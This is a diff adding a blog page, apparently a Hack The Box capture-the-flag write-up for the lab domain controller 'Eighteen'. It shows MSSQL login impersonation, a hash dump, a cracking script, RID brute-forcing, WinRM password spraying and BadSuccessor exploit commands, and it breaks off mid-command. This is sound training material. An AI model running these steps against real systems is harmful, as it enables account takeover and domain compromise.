@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar-1080x1080.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l1nk.icu","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Hack The Box [Season9] Eighteen Windows Easy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Season9] Eighteen WP">
+<meta property="og:url" content="http://l1nk.icu/2025/11/18/Season9-Eighteen/index.html">
+<meta property="og:site_name" content="L1nk&#39;s Blog">
+<meta property="og:description" content="Hack The Box [Season9] Eighteen Windows Easy">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-22T16:00:00.000Z">
+<meta property="article:author" content="l1nk">
+<meta property="article:tag" content="blog">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://l1nk.icu/2025/11/18/Season9-Eighteen/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://l1nk.icu/2025/11/18/Season9-Eighteen/","path":"2025/11/18/Season9-Eighteen/","title":"[Season9] Eighteen WP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Season9] Eighteen WP | L1nk's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">L1nk's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Flag"><span class="nav-number">1.</span> <span class="nav-text">User Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root-Flag"><span class="nav-number">2.</span> <span class="nav-text">Root Flag</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="l1nk"
+      src="/images/avatar-1080x1080.png">
+  <p class="site-author-name" itemprop="name">l1nk</p>
+  <div class="site-description" itemprop="description">Vidar-Team Web | Student</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kn1l" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kn1l" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:l1nk@foxmail.com" title="E-Mail → mailto:l1nk@foxmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/l1nkowo" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;l1nkowo" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://www.kinoko.fun/" title="https:&#x2F;&#x2F;www.kinoko.fun&#x2F;" rel="noopener" target="_blank">Kinoko</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://tech.ec3o.fun/" title="https:&#x2F;&#x2F;tech.ec3o.fun&#x2F;" rel="noopener" target="_blank">Ec3o</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://www.z221x.website/" title="https:&#x2F;&#x2F;www.z221x.website&#x2F;" rel="noopener" target="_blank">z221x</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.4db.icu/" title="https:&#x2F;&#x2F;blog.4db.icu&#x2F;" rel="noopener" target="_blank">Fc04dB</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.naclwww.com/" title="https:&#x2F;&#x2F;blog.naclwww.com&#x2F;" rel="noopener" target="_blank">NaCl</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.kiracoon.top/" title="https:&#x2F;&#x2F;blog.kiracoon.top&#x2F;" rel="noopener" target="_blank">Kiracoon</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://mysid.top/" title="https:&#x2F;&#x2F;mysid.top&#x2F;" rel="noopener" target="_blank">mysid</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://l1nk.icu/2025/11/18/Season9-Eighteen/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar-1080x1080.png">
+      <meta itemprop="name" content="l1nk">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L1nk's Blog">
+      <meta itemprop="description" content="Vidar-Team Web | Student">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[Season9] Eighteen WP | L1nk's Blog">
+      <meta itemprop="description" content="Hack The Box [Season9] Eighteen Windows Easy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [Season9] Eighteen WP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-11-18 00:00:00" itemprop="dateCreated datePublished" datetime="2025-11-18T00:00:00+08:00">2025-11-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-11-23 00:00:00" itemprop="dateModified" datetime="2025-11-23T00:00:00+08:00">2025-11-23</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>1.6k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>6 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">Hack The Box [Season9] Eighteen Windows Easy</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><code>kevin / iNa2we6haRj2gaw!</code></p>
+<p>Recon</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE  REASON          VERSION</span><br><span class="line">80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server  16.00.1000.00</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: EIGHTEEN</span><br><span class="line">|   NetBIOS_Domain_Name: EIGHTEEN</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: eighteen.htb</span><br><span class="line">|   DNS_Computer_Name: DC01.eighteen.htb</span><br><span class="line">|   DNS_Tree_Name: eighteen.htb</span><br><span class="line">|_  Product_Version: 10.0.26100</span><br><span class="line">|_  +7h00m00s from scanner time.</span><br><span class="line">5985/tcp open  http     syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></pre></td></tr></table></figure>
+
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>连接 mssql</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py kevin@<span class="variable">$IP</span></span><br></pre></td></tr></table></figure>
+
+<p>可以 impersonate appdev</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SQL (kevin  guest@master)&gt; enum_impersonate</span><br><span class="line">execute as   database   permission_name   state_desc   grantee   grantor   </span><br><span class="line">----------   --------   ---------------   ----------   -------   -------   </span><br><span class="line">b&#x27;LOGIN&#x27;     b&#x27;&#x27;        IMPERSONATE       GRANT        kevin     appdev </span><br><span class="line"></span><br><span class="line">SQL (kevin  guest@master)&gt; EXECUTE AS LOGIN = &#x27;appdev&#x27;</span><br><span class="line">SQL (appdev  appdev@master)&gt; use financial_planner</span><br><span class="line">ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner</span><br><span class="line">INFO(DC01): Line 1: Changed database context to &#x27;financial_planner&#x27;.</span><br><span class="line">SQL (appdev  appdev@financial_planner)&gt; select * from users</span><br><span class="line">  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   </span><br><span class="line">----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   </span><br><span class="line">1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03 </span><br><span class="line"></span><br><span class="line">SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>hashcat 跑太慢了，用 ai 生成个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> check_password_hash</span><br><span class="line"></span><br><span class="line">target_hash = <span class="string">&quot;pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133&quot;</span></span><br><span class="line"></span><br><span class="line">wordlist_path = <span class="string">&quot;/usr/share/wordlists/rockyou.txt&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Starting attack on: <span class="subst">&#123;target_hash&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Using Werkzeug&#x27;s native check_password_hash function...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(wordlist_path, <span class="string">&quot;r&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            password = line.strip()</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> check_password_hash(target_hash, password):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[+] PASSWORD FOUND: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[-] Password not found in wordlist.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] Error: Wordlist not found at <span class="subst">&#123;wordlist_path&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到结果 <code>iloveyou1</code></p>
+<p>现在我们可以使用 <code>admin:iloveyou1</code> 登录网站后台，好像用处不大</p>
+<p>rid brute 获取用户</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ nxc mssql <span class="variable">$IP</span> -u kevin -p <span class="string">&#x27;iNa2we6haRj2gaw!&#x27;</span> --rid-brute</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! </span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             500: EIGHTEEN\Administrator</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             501: EIGHTEEN\Guest</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             502: EIGHTEEN\krbtgt</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             512: EIGHTEEN\Domain Admins</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             513: EIGHTEEN\Domain Users</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             514: EIGHTEEN\Domain Guests</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             515: EIGHTEEN\Domain Computers</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             516: EIGHTEEN\Domain Controllers</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             517: EIGHTEEN\Cert Publishers</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             518: EIGHTEEN\Schema Admins</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             519: EIGHTEEN\Enterprise Admins</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             520: EIGHTEEN\Group Policy Creator Owners</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             521: EIGHTEEN\Read-only Domain Controllers</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             525: EIGHTEEN\Protected Users</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             526: EIGHTEEN\Key Admins</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             527: EIGHTEEN\Enterprise Key Admins</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             528: EIGHTEEN\Forest Trust Accounts</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             529: EIGHTEEN\External Trust Accounts</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             553: EIGHTEEN\RAS and IAS Servers</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1000: EIGHTEEN\DC01$</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1101: EIGHTEEN\DnsAdmins</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1102: EIGHTEEN\DnsUpdateProxy</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1601: EIGHTEEN\mssqlsvc</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser<span class="variable">$DC01</span></span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1603: EIGHTEEN\HR</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1604: EIGHTEEN\IT</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1605: EIGHTEEN\Finance</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1606: EIGHTEEN\jamie.dunn</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1607: EIGHTEEN\jane.smith</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1608: EIGHTEEN\alice.jones</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1609: EIGHTEEN\adam.scott</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1610: EIGHTEEN\bob.brown</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1611: EIGHTEEN\carol.white</span><br><span class="line">MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green</span><br></pre></td></tr></table></figure>
+
+<p>使用得到的用户名列表进行密码喷洒</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">mssqlsvc</span><br><span class="line">jamie.dunn</span><br><span class="line">jane.smith</span><br><span class="line">alice.jones</span><br><span class="line">adam.scott</span><br><span class="line">bob.brown</span><br><span class="line">carol.white</span><br><span class="line">dave.green</span><br></pre></td></tr></table></figure>
+
+<p>对 winrm 进行密码喷洒</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm <span class="variable">$IP</span> -u users.txt -p <span class="string">&#x27;iloveyou1&#x27;</span></span><br><span class="line">WINRM       10.10.11.95     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)</span><br><span class="line">WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\Administrator:iloveyou1</span><br><span class="line">WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\mssqlsvc:iloveyou1</span><br><span class="line">WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1</span><br><span class="line">WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1</span><br><span class="line">WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1</span><br><span class="line">WINRM       10.10.11.95     5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)</span><br></pre></td></tr></table></figure>
+
+<p>得到用户 <code>eighteen.htb\adam.scott:iloveyou1</code>，登录 winrm，得到 user flag</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i <span class="variable">$IP</span> -u <span class="string">&#x27;adam.scott&#x27;</span> -p <span class="string">&#x27;iloveyou1&#x27;</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott&gt; <span class="built_in">type</span> desktop/user.txt</span><br><span class="line">ed79a0a16c7d14b46890de4be15dffee</span><br></pre></td></tr></table></figure>
+
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>枚举发现靶机是一台 <code>Windows Server 2025</code> 的域控，可能受到 <code>BadSuccessor</code> 影响</p>
+<p>使用 <a target="_blank" rel="noopener" href="https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1">Pentest-Tools-Collection&#x2F;tools&#x2F;ActiveDirectory&#x2F;BadSuccessor.ps1 at main · LuemmelSec&#x2F;Pentest-Tools-Collection</a></p>
+<p>脚本需要进行部分修改</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改脚本</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\adam.scott&gt; (<span class="built_in">Get-Content</span> BadSuccessor.ps1) <span class="operator">-replace</span> <span class="string">&#x27;Out-GridView&#x27;</span>, <span class="string">&#x27;Format-Table -AutoSize&#x27;</span> | <span class="built_in">Set-Content</span> BadSuccessor.ps1</span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\adam.scott&gt; . .\BadSuccessor.ps1</span><br><span class="line"><span class="comment"># 检查</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\adam.scott&gt; BadSuccessor <span class="literal">-mode</span> check <span class="literal">-Domain</span> eighteen.htb</span><br><span class="line"></span><br><span class="line">[+] Checking <span class="keyword">for</span> Windows Server <span class="number">2025</span> Domain Controllers...</span><br><span class="line">[!] Windows Server <span class="number">2025</span> DCs found. BadSuccessor may be exploitable!</span><br><span class="line"></span><br><span class="line">HostName          OperatingSystem</span><br><span class="line"><span class="literal">--------</span>          <span class="literal">---------------</span></span><br><span class="line">DC01.eighteen.htb Windows Server <span class="number">2025</span> Datacenter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IdentitySID                                   IdentityName    OU                          Right</span><br><span class="line"><span class="literal">-----------</span>                                   <span class="literal">------------</span>    <span class="literal">--</span>                          <span class="literal">-----</span></span><br><span class="line">S<span class="literal">-1-5-21-1152179935-589108180-1989892463-1604</span> eighteen.htb\IT OU=Staff,DC=eighteen,DC=htb CreateChild</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 dMSA</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\adam.scott\Documents&gt; BadSuccessor <span class="literal">-mode</span> exploit <span class="literal">-Path</span> <span 